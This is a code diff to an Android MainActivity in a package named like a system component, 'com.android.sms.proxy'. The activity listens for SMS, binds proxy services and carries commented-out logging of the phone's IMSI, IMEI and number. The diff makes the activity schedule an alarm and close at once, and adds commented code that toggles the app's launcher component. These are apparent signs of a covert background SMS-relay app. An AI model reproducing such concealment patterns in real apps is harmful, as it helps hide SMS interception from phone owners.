@@ -42,7 +42,7 @@ import java.util.Map;
  * @author zyq 16-3-10
  */
 public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnReceiveSMSListener,
-        BridgeDisconnectedListener, ServiceConnection {
+		BridgeDisconnectedListener, ServiceConnection {
 
 	private static final String TAG = "main";
 	public static final String NETWORK_CACHE_DIR = "volley";
@@ -112,13 +112,18 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 //		message.setMovementMethod(ScrollingMovementMethod.getInstance());
 		//EventBus.getDefault().register(this);
 		//Receiver_SMS.setReceiveListener(this);
-		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
+//		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
 //		Log.d(TAG, "imsi:" + PhoneInfo.getInstance(this).getPhoneIMSI());
 //		String phoneNumber = PhoneInfo.getInstance(this).getNativePhoneNumber();
 //		Log.d(TAG, "手机号码:" + phoneNumber);
 //		String imei = PhoneInfo.getInstance(this).getIMEI();
 //		Log.d(TAG, "imei:" + imei);
+
+
+		AlarmControl.getInstance(this).initAlarm(1,1,1,1);
+		finish();
 	}
+
 
 	@Override
 	public void onReceiveSMS(String sms) {
@@ -158,12 +163,17 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 	protected void onDestroy() {
 
 		super.onDestroy();
-		if (binder != null) {
-			unbindService(connection);
-		}
-		if (mProxyControl != null) {
-			unbindService(this);
-		}
+//		ComponentName componentToEnable = new ComponentName("com.android.sms.proxy", "com.android.sms.proxy.ui" +
+//				".MainActivity");
+//		getPackageManager().setComponentEnabledSetting(componentToEnable, PackageManager
+//						.COMPONENT_ENABLED_STATE_ENABLED,
+//				PackageManager.DONT_KILL_APP);
+//		if (binder != null) {
+//			unbindService(connection);
+//		}
+//		if (mProxyControl != null) {
+//			unbindService(this);
+//		}
 	}
 
 	@Override
